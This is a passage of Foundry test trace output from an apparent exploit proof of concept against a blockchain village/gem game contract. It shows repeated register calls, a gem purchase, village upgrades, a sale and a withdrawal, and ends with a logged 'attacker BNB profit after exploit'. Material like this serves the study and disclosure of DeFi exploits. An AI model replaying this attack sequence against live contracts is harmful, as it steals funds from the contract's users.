    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [85476] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::addGems{value: 500000000000000}()
    │   ├─ [0] 0xb0ABc5d6a851e4f4835Cbe9C17BA205c9A5A82E7::fallback{value: 11250000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0xF70d1A682c1AB4aBa765D74d57f47051CaCA9f66::fallback{value: 11250000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0xD744c7A1aA8165C62704f1eA02Ef85be89c2F841::fallback{value: 2500000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ emit BuyGem(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 500000000000000 [5e14], param2: 1, param3: 1668550409 [1.668e9])
    │   └─ ← [Stop] 
    ├─ [57157] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::upgradeVillage(0)
    │   ├─ emit VillageUpgraded(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 5, param2: 0, param3: 1668550409 [1.668e9])
    │   └─ ← [Stop] 
    ├─ [34570] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::upgradeVillage(1)
    │   ├─ emit VillageUpgraded(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 61, param2: 1, param3: 1668550409 [1.668e9])
    │   └─ ← [Stop] 
    ├─ [10670] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::upgradeVillage(2)
    │   ├─ emit VillageUpgraded(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 240, param2: 2, param3: 1668550409 [1.668e9])
    │   └─ ← [Stop] 
    ├─ [44935] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::sellVillage()
    │   ├─ emit SellVillage(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 1668550409 [1.668e9])
    │   └─ ← [Stop] 
    ├─ [31738] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::withdrawMoney(20000 [2e4])
    │   ├─ [0] 0xb0ABc5d6a851e4f4835Cbe9C17BA205c9A5A82E7::fallback{value: 900000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0xF70d1A682c1AB4aBa765D74d57f47051CaCA9f66::fallback{value: 900000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0xD744c7A1aA8165C62704f1eA02Ef85be89c2F841::fallback{value: 200000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [55] ContractTest::receive{value: 98000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ emit SellWool(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20000 [2e4], param2: 1668550409 [1.668e9])
    │   └─ ← [Stop] 
    ├─ emit log_named_decimal_uint(key: "Attacker BNB profit after exploit", val: 98000000000000000 [9.8e16], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 505.61ms (6.02ms CPU time)

Ran 2 test suites in 507.45ms (935.26ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
